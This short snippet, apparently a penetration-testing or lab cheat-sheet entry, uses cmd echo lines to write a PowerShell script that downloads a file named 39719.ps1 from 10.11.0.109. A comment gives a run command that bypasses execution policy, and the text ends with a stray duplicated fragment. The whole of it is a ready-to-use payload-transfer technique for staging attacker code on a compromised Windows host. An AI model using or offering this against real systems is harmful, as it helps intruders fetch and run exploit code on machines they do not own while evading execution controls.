echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.109/39719.ps1" >>wget.ps1
echo $file = "39719.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

# to run: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

= New-Object System.Net.WebClient
